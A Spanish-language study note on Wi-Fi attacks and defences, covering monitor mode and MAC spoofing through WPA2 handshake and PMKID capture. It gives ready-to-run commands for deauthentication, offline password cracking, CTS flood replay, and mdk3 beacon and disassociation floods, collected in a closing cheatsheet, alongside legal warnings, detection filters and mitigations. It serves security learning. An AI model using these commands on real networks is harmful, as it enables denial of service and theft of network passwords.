---
aliases:
  - Modo Monitor
  - Ataques WiFi
  - Hacking Inalámbrico
  - 802.11
  - Handshake WPA2
tags:
  - sec/wireless
  - hacking/herramientas
  - redes/conceptos
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Hacking Wi-Fi Tarjetas de Red]]"
  - "[[Aircrack-ng Suite de Herramientas]]"
  - "[[MDK3 Herramienta de Auditoría Inalámbrica]]"
  - "[[Wireshark y Tshark]]"
  - "[[Macchanger Herramienta de Modificación MAC]]"
  - "[[Tcpreplay]]"
fuente: "https://www.wi-fi.org/discover-wi-fi/security"
---

# Hacking Wi-Fi: Fundamentos y Ataques

Las redes 802.11 son el único medio donde **el espectro es compartido y el aire es el canal de ataque**: cualquier estación a rango puede escuchar, fabricar y envenenar tramas de capa 2. Esta nota explica la mecánica del protocolo —tipos de trama, asociación, handshake EAPOL de 4 vías, evolución WEP→WPA3— y con ella los flujos de captura, cracking y DoS, más la cara defensora: cómo se detectan y se mitigan.

> [!warning] Marco legal
> Capturar tráfico, desautenticar clientes o montar un evil twin en una red que **no poseas o no tengas por escrito** es delito. Todo lo siguiente se practica en laboratorio propio (AP doméstico con autorización, HTB Academy, netlab aislado). Las herramientas documentadas **no se ejecutan** desde esta nota: son referencia de estudio.

## 1. Modelo 802.11: el aire, las estaciones y los tipos de trama

| Elemento | Significado |
|---|---|
| **STA** | Estación (cliente: portátil, móvil) |
| **AP** | Punto de acceso (BSSID = su MAC) |
| **BSS/ESS** | Celda inalámbrica / conjunto de celdas con mismo ESSID |
| **SSID (ESSID)** | Nombre de la red (en beacons, en claro) |
| **CANAL** | Frecuencia de operación (2,4 GHz: 1–13; 5 GHz: 36+) |

### Clases de trama (Frame Control: Type/Subtype)

| Tipo | Subtipos clave | Función | Papel en auditoría |
|---|---|---|---|
| **Management (00)** | `beacon`, `probe req/resp`, `authentication`, `deauthentication`, `association req/resp`, `disassociation` | Anuncio y ciclo de vida de la conexión | Beacons falsos, deauth para capturar handshake, evil twin |
| **Control (01)** | `RTS`, `CTS`, `ACK`, `Block ACK` | Acceso al medio (CSMA/CA) | CTS flood (DoS de ancho de banda) |
| **Data (10)** | `data`, `QoS data` | Transporte de datos, incluidos los **EAPOL** del handshake | Captura del handshake / PMKID |

> [!info] La grieta estructural de 802.11 (WEP→WPA2)
> Hasta **802.11w/PMF** (2009+), los frames `deauthentication` y `disassociation` **no están autenticados**: cualquiera puede fabricarlos con la MAC del AP o del cliente y el otro extremo los obedece. De ahí nacen los ataques de deauth — y de ahí la necesidad de PMF (Protected Management Frames) que veremos en §12.

### Ciclo de conexión de un cliente

```
1. Escaneo        → probe request / escucha beacons
2. Autenticación  → open system (2 tramas: request/response)   ← "estás autenticado"
3. Asociación     → association request/response               ← "eres parte de la ESS"
4. Intercambio    → 4-way EAPOL (WPA2-PSK) o 802.1X (Enterprise)
5. Datos          → tráfico cifrado con la PTK derivada
```

## 2. Modo monitor

El modo monitor permite capturar y escuchar **todos** los paquetes del aire en un canal, sin estar asociado: identifica APs (nombre, MAC, clientes) y clientes — la base de cualquier ataque posterior.

> [!info] Modo monitor vs. modo promiscuo
> El **modo promiscuo** (Ethernet) entrega al stack solo lo dirigido a la interfaz o broadcast. El **modo monitor** opera por debajo: captura tramas 802.11 crudas —incluidas las de otras estaciones y los management frames— en un canal concreto sin asociarse. Es lo que necesitan airodump, aireplay, mdk3 y Wireshark con filtros `wlan`.

### Configurar la interfaz en modo monitor

Identificamos la interfaz Wi-Fi con:

```bash
ifconfig
```

![[Pasted image 20240709115933.png]]

Tenemos diferentes tipos de interfaces; la que utilizaremos, la tarjeta Wi-Fi, es `wlan0`. Para un funcionamiento correcto es necesario operar como usuario `root`.

Primero, desactivamos la tarjeta:

```bash
ifconfig wlan0 down
```

> [!tip] ¿Por qué desactivar la interfaz?
> Desactivar la interfaz antes de cambiar a modo monitor evita conflictos con el sistema y con los servicios de red que puedan estar usándola: la tarjeta arranca desde un estado "limpio" antes de que `airmon-ng` la reconfigure.

Utilizamos [[Aircrack-ng Suite de Herramientas|Aircrack-ng]] y sus herramientas:

```bash
airmon-ng start wlan0
```

![[Pasted image 20240709122645.png]]

La tarjeta ya está en modo monitor: `airmon-ng` suele crear una interfaz virtual con sufijo `mon` (p. ej. `wlan0mon`).

> [!info] `airmon-ng` y la nueva interfaz
> Al ejecutar `airmon-ng start wlan0` con éxito, a menudo se crea una interfaz virtual (`wlan0mon` o `mon0`) que es la que realmente opera en modo monitor. Las herramientas de `aircrack-ng` (`airodump-ng`, `aireplay-ng`) deben apuntar a **esa** interfaz, no a la `wlan0` original.

Como dato adicional, si ejecutamos `ifconfig`, notaremos que la tarjeta original ha desaparecido (la desactivamos al inicio). Para verificar que está activa:

```bash
iwconfig
```

![[Pasted image 20240709122828.png]]

Existen dos servicios que pueden causar problemas y es preferible cerrarlos:

```bash
pkill dhclient && pkill wpa_supplicant
# alternativa:
killall dhclient wpa_supplicant 2>/dev/null
# y de forma más completa:
airmon-ng check kill
```

> [!warning] Servicios que interfieren con el modo monitor
> `dhclient` (cliente DHCP) y `wpa_supplicant` (gestor WPA) intentan gestionar la interfaz. Con la tarjeta en modo monitor, estos servicios pueden interrumpir la captura o devolver la interfaz a modo gestionado, inestabilizando las herramientas de auditoría. Detenerlos deja la interfaz bajo control exclusivo de la suite de ataque.

Activamos la interfaz:

```bash
ifconfig wlan0 up
```

Y comprobamos:

![[Pasted image 20240709123444.png]]

Para desactivar el modo monitor:

```bash
airmon-ng stop wlan0mon
service networking restart    # o: systemctl restart NetworkManager
```

Restablecer el servicio de red es **crucial** para recuperar la conectividad normal después de la auditoría.

## 3. Falsificando la MAC de nuestra tarjeta

Con la interfaz en modo monitor conviene cambiar la MAC con [[Macchanger Herramienta de Modificación MAC|macchanger]].

> [!info] ¿Por qué falsificar la MAC?
> 1. **Anonimato**: oculta la MAC real del adaptador en las capturas y logs del AP.
> 2. **Evitar listas negras/blancas**: algunos AP filtran por MAC.
> 3. **Impersonación**: simular otro dispositivo en el laboratorio.

Verificamos la MAC actual:

```bash
macchanger -s wlan0
```

![[Pasted image 20240709125950.png]]

Listamos las MACs disponibles para uso:

```bash
macchanger -l
```

![[Pasted image 20240709130015.png]]

Elegimos una (en el ejemplo, de Sony), bajamos la interfaz y la cambiamos:

```bash
ifconfig wlan0 down
macchanger --mac=5c:a6:e6:08:00:46 wlan0
ifconfig wlan0 up
```

> [!tip] Estructura de la MAC: OUI y NIC
> Una MAC de 48 bits se divide en **OUI** (primeros 24 bits = fabricante) y **NIC** (últimos 24 bits = interfaz concreta). Al falsificar se suele mantener un OUI coherente con el fabricante que se quiere simular y se varía la parte NIC. En modo monitor a veces se usa además una MAC *randomizada* para no correlacionar capturas.

Verificación final:

![[Pasted image 20240709135123.png]]

## 4. Análisis de entorno con airodump

Con el modo monitor y la MAC lista, visualizamos el aire:

```bash
airodump-ng wlan0mon
```

![[Pasted image 20240709142924.png]]

**Primera línea**: canal actual, hora y fecha. Al ejecutarse, `airodump-ng` hace *channel hopping* — salta continuamente por los canales para encontrar paquetes de todas las redes.

> [!info] Channel hopping
> El salto continuo de canal (1…14 en 2,4 GHz, luego 5 GHz) da una visión completa del entorno. Para ataques concretos hay que **fijar** el canal (`-c <canal>`): si airodump salta mientras intentas capturar el handshake, pierdes tramas del AP objetivo.

### Columnas superiores (redes / AP)

| Columna | Significado | Lectura práctica |
|---|---|---|
| **BSSID** | MAC del AP | Identidad del punto de acceso |
| **PWR** | Potencia de señal (dBm, negativa) | `-30` muy cerca, `-90` en el límite; `-1` = driver sin RSSI |
| **Beacons** | Tramas beacon recibidas (~10/s por AP) | 0 → AP viejo o silencioso (oculto) |
| **Data** | Paquetes de datos capturados | Tráfico real en curso |
| **#Data / #s** | Datos en los últimos 10 s | Ritmo de tráfico |
| **CH** | Canal del AP | Para fijar `-c` |
| **MB** | Tasa máxima soportada (Mbps) | 54 = 802.11g, 135+ = n/ac |
| **ENC** | Cifrado: `WPA`, `WPA2`, `WPA3`, `WEP`, `OPN` | Define el ataque viable |
| **CIPHER** | `CCMP` (WPA2), `TKIP` (WPA), `GCMP` (WPA3) | TKIP suele indicar equipo antiguo |
| **AUTH** | `OPN`, `PSK`, `PSKA`, `MGT` | PSK = doméstico; MGT = 802.1X/Enterprise |
| **ESSID** | Nombre de la red | Objetivo identificable |
| **Closed/Essid** | SSID oculto | Habrá que probe-ellevar (mdk3/airodump `-e`) |

> [!info] Tipos de AUTH
> - **OPN**: sin cifrado ni autenticación.
> - **WEP/PSKA**: clave compartida antigua (WEP).
> - **WPA/WPA2-PSK**: contraseña precompartida (hogares) → ataque al handshake + diccionario.
> - **WPA/WPA2-EAP/MGT (Enterprise)**: servidor RADIUS + 802.1X por usuario → no se ataca con diccionario; se ataca la infraestructura (evil twin, credenciales por usuario).

### Columnas inferiores (clientes)

| Columna | Significado |
|---|---|
| **STATION** | MAC del cliente |
| **BSSID** | AP al que está asociado |
| **PWR** | Señal del cliente |
| **Probe** | ESSIDs que el cliente está buscando (revela redes conocidas → evil twin dirigido) |
| **Rate/Lost/Frames** | Tasa, pérdidas y tramas del cliente |

## 5. Filtrar y exportar evidencias

Fijamos el objetivo por ESSID (más práctico) o por BSSID, y **siempre fijamos canal**:

```bash
airodump-ng --essid Pruebas -c 11 wlan0mon
airodump-ng --bssid 88:53:D4:92:B9:CC -c 11 wlan0mon
```

![[Pasted image 20240709173827.png]]

Ver nada no sirve para el informe: hay que **almacenar**. Añadimos `-w`:

```bash
airodump-ng -w Captura --essid Pruebas -c 11 wlan0mon
# genera Captura-01.cap (y .kismet.csv/.log.csv)
```

![[Pasted image 20240709174202.png]]

> [!tip] Buenas prácticas de captura
> - Fijar canal (`-c`) = no perder tramas por el hopping.
> - Guardar siempre `.cap` con `-w` + timestamp para el informe (ver [[Creación de Informes en LaTeX]]).
> - Copiar el hash SHA-256 de la captura como cadena de custodia.

## 6. El handshake de 4 vías (EAPOL): qué se captura y por qué funciona

En WPA/WPA2-PSK, cuando un cliente (re)conecta se intercambian **cuatro tramas EAPOL** cuyo objetivo es derivar una clave de sesión efímera sin revelar la contraseña:

| Msg | Dirección | Contenido | ¿Qué aporta al atacante? |
|---|---|---|---|
| **1** | AP → STA | `ANonce` (nonce aleatorio del AP) | — |
| **2** | STA → AP | `SNonce` + **MIC** calculado con la clave derivada de la contraseña | **El material a crackear** |
| **3** | AP → STA | `GTK` (clave de grupo) cifrada con la PTK | — |
| **4** | STA → AP | ACK | Completa la sesión |

**Derivación (mecánica):**

```
PMK  = PBKDF2(passphrase, SSID, 4096 iteraciones, SHA-1) → 256 bits   ← "la contraseña como hash"
PTK  = PRF-512(PMK, "Pairwise key expansion", Min(AA,SA) ‖ Max(AA,SA) ‖ Min(ANonce,SNonce) ‖ Max(ANonce,SNonce))
MIC  = HMAC-MD5/SHA1-128(PMK… sobre el frame EAPOL)
```

- El atacante ve SSID, MACs, ANonce, SNonce y MIC en claro dentro de la captura.
- Con una candidata ("password123") recalcula PMK→PTK→MIC: **si el MIC coincide, esa es la contraseña**.
- Por eso el cracking es **offline y silencioso**: el AP no recibe intentos, no hay bloqueo, y la velocidad la pone tu CPU/GPU. La seguridad entera depende de la entropía de la frase — un `rockyou` contra WPA2 cae en segundos.

> [!info] PMKID: el handshake sin cliente
> Un cliente asociado que renueva claves (o cierra sesión) genera un frame con **PMKID** = `HMAC-SHA1-128(PMK, "PMK Name" ‖ AA ‖ SPA)`. Capturarlo con `hcxdumptool -i wlan0mon -w pmkid.pcapng` permite crackear la PMK **sin esperar a desconectar a nadie** y sin que exista tráfico de datos. Se convirtió en el método preferido por discreción (2018+, "hashcat mode 16800/22000").

### Cómo obtener el handshake

**A. Pasivo** — paciencia: esperar a que un cliente se desconecte y vuelva a conectarse (o que llegue un dispositivo nuevo).

**B. Deautenticación dirigida** — forzar la reconexión de un cliente concreto:

```bash
aireplay-ng -0 10 -e Pruebas -c 4E:5E:E5:84:57:47 wlan0mon
# -0  modo deattack (deauth), 10 = nº de tramas a enviar
# -e  ESSID objetivo
# -c  MAC del cliente a desconectar
```

**C. Deautenticación global** — cuando no conocemos clientes:

```bash
aireplay-ng -0 10 -e Pruebas -c FF:FF:FF:FF:FF:FF wlan0mon   # broadcast
aireplay-ng -0 10 -e Pruebas wlan0mon                         # sin -c (equivale a todos)
```

> [!warning] Deauthentication: por qué funciona
> Los frames de deauth **no están autenticados** hasta 802.11w: el cliente acepta como legítimo un deauth fabricado "por el AP". Al desconectarse, el equipo se reassocia y genera un **nuevo handshake** que ya estamos capturando con airodump en el canal fijo. Es un ataque de capa 2, reversible (el cliente se reconecta solo), pero **ilegal sin autorización** y bloqueable con PMF.

**D. Falsa autenticación (fakeauth)** — principalmente para WEP o para mantener una estación falsa viva:

```bash
aireplay-ng -1 0 -e Pruebas -a 88:53:D4:92:B9:CC -h 08:00:46:33:45:55 wlan0mon
# -1 fakeauth, 0 = intervalo; -a BSSID AP; -h MAC "del cliente" que nosotros controlamos
```

> [!info] Fakeauth en WPA/WPA2
> Con WPA2 la autenticación no termina en `authentication request`: exige el intercambio de claves completo, así que una fakeauth **por sí sola no da acceso** ni handshake. Su utilidad real es WEP (mantener la estación asociada para generar IVs) y algunos escenarios de mantenimiento.

### Flujo de trabajo completo de captura + cracking

```bash
# 1. Entorno limpio y modo monitor (§2)
airmon-ng check kill && airmon-ng start wlan0

# 2. Identificar objetivo y canal (§4)
airodump-ng wlan0mon                    # → BSSID + CH + ESSID

# 3. Captura FOCADA con -w (§5)
airodump-ng -w cap --bssid <AP> -c <CH> wlan0mon

# 4. Forzar handshake (§6B) en otra terminal
aireplay-ng -0 5 -e <ESSID> -c <STA> wlan0mon
# → "WPA handshake: 88:53:D4:92:B9:CC" en la esquina de airodump

# 5. Cracking offline
aircrack-ng -w rockyou.txt -b <AP> cap-01.cap
hashcat -m 22000 capture.22000 rockyou.txt     # formato moderno (PMKID+handshake)
john --wordlist=rockyou.txt --format=wpapsk cap-01.cap
```

## 7. Ataques de manipulación del medio (DoS) y su mecánica

### 7.1 RTS/CTS y el secuestro de ancho de banda (CTS flood)

**RTS/CTS** es el mecanismo CSMA/CA de reserva de canal: una estación envía **RTS** con la *duración* que necesita; el receptor contesta **CTS** repitiendo esa duración; todas las estaciones que oyen el CTS levantan su **NAV** (*Network Allocation Vector*) y guardan silencio ese tiempo — así se resuelve el **problema del nodo oculto** (dos estaciones que no se oyen pero sí oyen al AP).

| Trama | Quién la emite | Campo clave |
|---|---|---|
| **RTS** | Estación que quiere transmitir | `Duration` (µs, 0–32.767) |
| **CTS** | AP / estación destino (o "CTS to self") | Copia el `Duration` → todo el mundo calla |
| **ACK** | Receptor | Confirma la recepción |

![[Pasted image 20240711131535.png]]

**El ataque**: fabricar un CTS con `Duration` enorme (p. ej. 30.000 µs, el máximo de 32.767) **haciéndose pasar por el AP**: todas las estaciones a rango reservan el canal para nadie → DoS total del espectro. Recorrido del laboratorio:

1. Capturar un CTS legítimo del AP con **Wireshark** (interfaz en monitor):

![[Pasted image 20240712214007.png]]

2. Filtrar el paquete (filtro `wlan.fc.type_subtype == 0x1c` — CTS):

![[Pasted image 20240712214113.png]]

3. Localizar un CTS con la MAC del AP víctima:

![[Pasted image 20240712234109.png]]

4. Exportar **solo ese paquete** (Export Specified Packets → paquete único):

![[Pasted image 20240712234225.png]]

5. Abrirlo con [[GHex Editor Hexadecimal|GHex]]:

![[Pasted image 20240712234423.png]]

6. Los pares 9–10 de la cabecera son los microsegundos en hexadecimal; calcular el valor nuevo con Python:

![[Pasted image 20240712234735.png]]

7. Editar el valor (p. ej. `30000` decimal → hex) en GHex:

![[Pasted image 20240712235339.png]]

8. Reabrir en Wireshark para verificar que el campo quedó modificado:

![[Pasted image 20240712235431.png]]

9. Reinyectar en la red con [[Tcpreplay|Tcpreplay]]:

```bash
tcpreplay --intf1=wlan0mon --topspeed --loop=2000 ctsframe.pcap 2>/dev/null
# --intf1   interfaz de salida
# --topspeed inyectar lo más rápido posible
# --loop=2000 repetir el frame 2000 veces
```

10. En tarjetas sin capacidad de inyección completa aparecerá un error de soporte:

![[Pasted image 20240713000335.png]]

> [!warning] Impacto (CTS flood)
> Un `Duration` descomunal dice a **todos** los dispositivos del canal que está ocupado: denegación de servicio total mientras dure la ráfaga. Es reversible (basta dejar de reinyectar) pero efectiva, y la efectividad depende de la capacidad de inyección de la tarjeta (ver [[Hacking Wi-Fi Tarjetas de Red]]).

### 7.2 Beacon flood (inundación de beacons)

Los **beacons** son los anuncios periódicos (~cada 100 ms) con los que un AP dice "existo:SSID, seguridad, tasas". El ataque lanza miles de beacons con SSIDs falsos en el canal del AP objetivo para saturar el espectro y confundir a los clientes:

```bash
for i in $(seq 1 10); do echo "MyNetwork$i" >> redes.txt ; done
```

![[Pasted image 20240713181336.png]]

```bash
mdk3 wlan0mon b -f redes.txt -a -s 1000 -c 1
# b  modo beacon flood   -f archivo de SSIDs   -a  todas las APs de la lista
# -s 1000  intervalo entre beacons (µs)        -c 1  canal fijo
```

![[Pasted image 20240713182656.png]]

> [!warning] Impacto (beacon flood)
> 1) **Confusión del usuario** (lista de redes interminable), 2) **DoS de cliente** (los equipos gastan CPU/memoria procesando beacons falsos), 3) **saturación del espectro** que degrada el rendimiento de la red real. Ver [[MDK3 Herramienta de Auditoría Inalámbrica]].

### 7.3 Disassociation Amok (MDK3)

Con `airodump-ng` escuchando para capturar:

![[Pasted image 20240713184446.png]]

Creamos una *blacklist* con los BSSID a desconectar:

![[Pasted image 20240713184650.png]]

```bash
mdk3 wlan0mon d -w blacklist -c 11
# d  modo disassociation   -w archivo con BSSID   -c canal
```

![[Pasted image 20240713185010.png]]

> [!info] Disassociation vs. Deauthentication
> A menudo se usan como sinónimos, pero en 802.11 tienen fines distintos:
> - **Deauthentication**: termina la autenticación → el cliente debe rehacer autenticación + asociación.
> - **Disassociation**: termina la asociación; la autenticación persiste → basta reasociarse.
> Ambos se falsifican para DoS o para forzar un nuevo handshake; el modo "Amok" de MDK3 los envía de forma agresiva y masiva.

## 8. Evil twin y ataques de infraestructura (visión general)

| Ataque | Mecánica | Señales defensivas |
|---|---|---|
| **Evil twin** | AP falso con mismo ESSID (y a veces mismo BSSID) de mayor potencia → clientes conectan al atacante (rogue DHCP/AP) | Alertas de BSSID duplicado, portal caído, certificados cambiados |
| **Deauth + captive portal** | Desautenticar y ofrecer un portal "iniciar sesión de nuevo" para robar la PSK | Solicitudes de deauth masivas en logs |
| **KARMA / respond to all probes** | El atacante responde a *cualquier* probe request con SSIDs preferidos | Dispositivos que "se conectan solos" a redes desconocidas |
| **PMKID harvesting** | Capturar PMKID sin desautenticar (§6) | Pocas señales: solo tráfico de renegociación |

Detección típica: IDS inalámbricos (Kismet, Zeek + captura, WIDS corporativos) vigilando deauths anómalos, ESSIDs duplicados y probes sospechosos — ver §11.

## 9. Evolución del cifrado: WEP → WPA3

| Estándar | Año | Mecanismo | Debilidad / estado |
|---|---|---|---|
| **WEP** | 1997 | RC4 con IV de 24 bits compartidos por todos | IVs se repiten tras ~5 000 paquetes → **roto en minutos** con aircrack (aireplay ARP injection lo acelera) |
| **WPA** (2003) | Temporal: TKIP + MIC, mismo hardware WEP | Cambia RC4 por fase de claves por paquete | Mejora, pero TKIP roto en 2008–2009 → solo transición |
| **WPA2** (2004) | AES-CCMP (802.11i) | 4-way EAPOL + PMK de PBKDF2 | Sólido frente a red; vulnerable a **offline dictionary** (PSK débil), KRACK (2017), PMKID |
| **WPA3** (2018) | **SAE** (Dragonfly) reemplaza a la PSK | Imposible ataque offline con SAE; forward secrecy | Dragonblood (2019) obliga a parches; modo "compatibilidad" WPA2 sigue habilitándose a menudo |
| **802.11w (PMF)** | 2009 | Deauth/disassoc **firmados** | Corta los ataques de §6/§7 (opcional en WPA2, obligatorio en WPA3-Personal) |
| **802.1X / Enterprise** | — | RADIUS + credenciales por usuario (EAP-TLS, PEAP) | Un Rogue AP no obtiene PSK compartida; endurecer con certificados |

> [!info] KRACK y Dragonblood (mención obligatoria)
> - **KRACK** (Key Reinstallation Attacks, 2017): reproducir mensajes del 4-way handshake re-instala claves nonce=0 → permite degradar a desautenticación/posible descifrado en implementaciones no parcheadas. Afectaba a clientes (Android/Linux), no a la criptografía.
> - **Dragonblood** (2019): ataques de canal lateral y downgrade contra **WPA3-SAE** (diccionario descubrible en ciertos modos, fuerza de grupo débil). Recordatorio: WPA3 solo protege si el AP **no** ofrece también modo transicional WPA2.

## 10. Detección (lado defensor)

| Señal | Qué delata | Herramienta |
|---|---|---|
| Ráfagas de `deauth/disassoc` con MACs falsificadas | Captura de handshake / DoS | [[Wireshark y Tshark]] (`wlan.fc.type_subtype == 0x0c/0x0a`), WIDS |
| Cientos de beacons con SSIDs nuevos | Beacon flood | airodump, Kismet |
| Dos AP con mismo ESSID/BSSID | Evil twin | WIDS, alertas de cliente |
| CTS con `Duration` descomunal reinyetrado | CTS flood | Wireshark: `wlan.fc.type_subtype == 0x1c` + inspección del campo |
| Solicitudes de probe a decenas de redes | KARMA/OSINT de clientes | airodump columna Probe |
| Intentos de crack offline | Señal *después*: inicio de sesión con pass errónea repetida en el servidor | Logs del portal/RADIUS (el cracking en sí es offline e indetectable) |

```bash
# Filtro de deauth para auditoría defensiva
tshark -i wlan0mon -Y 'wlan.fc.type_subtype == 0x0c' -T fields -e wlan.sa -e wlan.da | sort | uniq -c
# Muchas tramas de deauth con SA falsificada = ataque en curso
```

## 11. Mitigación

| Medida | Qué resuelve | Nota |
|---|---|---|
| **WPA3-Personal (SAE)** | Ataque offline al diccionario | Comprobar que **no** haya modo transicional WPA2 |
| **PMF / 802.11w (obligatorio)** | Deauth/disassoc falsificados | `iw dev wlan0 set power_save` no; en el AP: "Protected Management Frames: Required" |
| **802.1X (Enterprise)** + EAP-TLS | PSK compartida robable | Credencial por usuario, revocable |
| **PSK larga (≥ 16 caracteres aleatorios)** | Diccionario/rockyou | Mínimo viable si no hay WPA3 |
| **Segmentación de red / VLAN de invitados** | Movimiento lateral tras comprometer un PSK | AISLAR IoT y visitantes |
| **Deshabilitar WPS** | Pixie-Dust / fuerza bruta PIN | Siempre |
| **WIDS/monitoreo continuo** | Evil twin, deauth, beacon flood | Kismet, WIDS corporativos |
| **Desactivar interfaces/`probe` innecesarias** | Fuga de ESSIDs preferidos | Sobre todo en móviles |
| **DNS sobre HTTPS/TLS + HSTS** | Captura tras evil twin | Limita el daño del portal falso |

## 12. Errores comunes del operador

1. **No fijar canal** en la captura (`-c`) → handshakes perdidos por el channel hopping.
2. **Apuntar herramientas a `wlan0` en vez de `wlan0mon`** → errores `ioctl` o capturas vacías.
3. **Olvidar `airmon-ng check kill`** → NetworkManager/wpa_supplicant pelean por la interfaz.
4. **Deauth masivo sin necesidad** → genera ruido, puede tumbar la red del lab y no da más handshake que un deauth dirigido.
5. **No guardar con `-w`** → la "evidencia" no existe para el informe.
6. **Probar rockyou sin comprobar el `.cap`** → cracks fallidos por handshake incompleto: verificar `aircrack-ng cap-01.cap` antes.
7. **Confundir ENC con CIPHER/AUTH**: `WPA2` no dice si es PSK o Enterprise — mirar las tres columnas.
8. **No restaurar la red al terminar** (`airmon-ng stop` + `NetworkManager`) → el siguiente trabajo arranca con la interfaz rota.

## 13. Cheatsheet

```bash
# Entorno
airmon-ng check kill; airmon-ng start wlan0        # → wlan0mon
iw dev; iwconfig                                    # verificar modo/canal

# Descubrimiento
airodump-ng wlan0mon                                # todo el aire (hopping)
airodump-ng -w cap --bssid <AP> -c <CH> wlan0mon    # captura FOCADA

# Forzar handshake
aireplay-ng -0 5 -e <ESSID> -c <STA> wlan0mon       # deauth dirigido
aireplay-ng -1 0 -e <E> -a <AP> -h <MIAMAC> wlan0mon  # fakeauth (WEP/lab)

# Cracking offline
aircrack-ng -w rockyou.txt -b <AP> cap-01.cap
hashcat -m 22000 pmkid_or_hs.22000 rockyou.txt
hcxdumptool -i wlan0mon -w pmkid.pcapng             # PMKID sin deauth

# DoS (laboratorio)
mdk3 wlan0mon b -f redes.txt -a -s 1000 -c 1        # beacon flood
mdk3 wlan0mon d -w blacklist -c 11                  # disassociation amok
tcpreplay --intf1=wlan0mon --topspeed --loop=2000 cts.pcap  # CTS flood

# Cierre
airmon-ng stop wlan0mon; systemctl start NetworkManager
```

## 14. Referencias

- Wi-Fi Alliance — seguridad: <https://www.wi-fi.org/discover-wi-fi/security>
- 802.11 deauth (CVE-2019-15121/802.11w): <https://www.wi-fi.org/discover-wi-fi/security> · <https://networklessons.com/wireless/ieee-802-11w-protected-management-frames>
- KRACK attacks: <https://www.krackattacks.com/>
- Dragonblood (WPA3-SAE): <https://dragonblood.info/>
- Aircrack-ng: <https://www.aircrack-ng.org/>
- Hashcat mode 22000: <https://hashcat.net/wiki/doku.php?id=example_hashes>
- HackTricks — WiFi: <https://book.hacktricks.wiki/en/wireless-networks/>

## Relacionadas

- [[Hacking Wi-Fi Tarjetas de Red]] — chipsets, driver stack, `iw list`
- [[Aircrack-ng Suite de Herramientas]] — airmon/airodump/aireplay/aircrack en detalle
- [[MDK3 Herramienta de Auditoría Inalámbrica]] — beacon flood, disassociation, probes
- [[Wireshark y Tshark]] / [[Tshark]] — filtros 802.11 y captura forense
- [[Macchanger Herramienta de Modificación MAC]] — anonimato de la MAC
- [[Tcpreplay]] — reinyección de tramas capturadas
